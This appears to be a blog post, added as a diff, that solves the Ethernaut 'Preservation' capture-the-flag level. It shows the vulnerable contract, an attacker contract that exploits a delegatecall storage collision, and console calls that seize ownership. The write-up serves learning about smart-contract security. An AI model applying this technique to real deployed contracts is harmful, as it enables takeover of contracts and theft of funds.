@@ -1,0 +1,115 @@
+---
+title: Ethernaut - Preservation - Solution
+date: '2024-06-10'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Preservation CTF
+---
+
+# Ethernaut - Preservation - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
+
+## Solution
+
+The goal of this challenge is to become the `owner`.
+
+If you don't have a solid understanding of `delegatecall` and storage collisions yet, [this blog post](https://blog.finxter.com/delegatecall-or-storage-collision-attack-on-smart-contracts/) is a great introduction.
+
+We'll execute our attack via three steps:
+
+1. Deploy an attacker contract with a `setTime()` function and design its storage layout such that a call to `setTime()` will lead to a collision with the level's `owner`.
+2. Use either the `setFirstTime()` or the `setSecondTime()` function to set `timeZone1Library` to our attacker's address.
+3. Use `setFirstTime()` to set `owner` to our EOA's address.
+
+For step 1, we'll deploy the following attacker contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract PreservationAttacker {
+    uint256 occupyFirstSlot = 42;
+    uint256 occupySecondSlot = 42;
+    uint256 owner;
+
+    function setTime(uint256 _owner) external {
+        owner = _owner;
+    }
+}
+```
+
+In my case, the address of the deployed `PreservationAttacker` reads 0x2124E3b48A11008d36171b9a7e8315fE572E341C.
+
+Next, we can either use `setFirstTime()` or `setSecondTime()` to set `timeZone1Library` to this address. 
+However, since those functions expect a `uint256` as their parameter, we must first convert the hex representation of our address to decimal via
+
+```bash
+cast to-dec 0x2124E3b48A11008d36171b9a7e8315fE572E341C
+# Result: 189219358187588105730525764077460654362006008860
+```
+
+and subsequently use the Ethernaut console to call the setter:
+
+```javascript
+await contract.setFirstTime("189219358187588105730525764077460654362006008860")
+```
+
+Notice that we pass the big number as a string to avoid JavaScript-related overflow issues during the call.
+
+With our `timeZone1Library` set to our attacker, we can now use `setFirstTime()` to set the `owner` to our EOA's address.
+Assuming that this address is 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, we can first convert it to decimal representation
+
+```bash
+cast to-dec 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
+# Result: 520786028573371803640530888255888666801131675076
+```
+
+and then make the call via the Ethernaut console
+
+```javascript
+await contract.setFirstTime("520786028573371803640530888255888666801131675076")
+```
+
+making us the `owner` and completing the challenge.
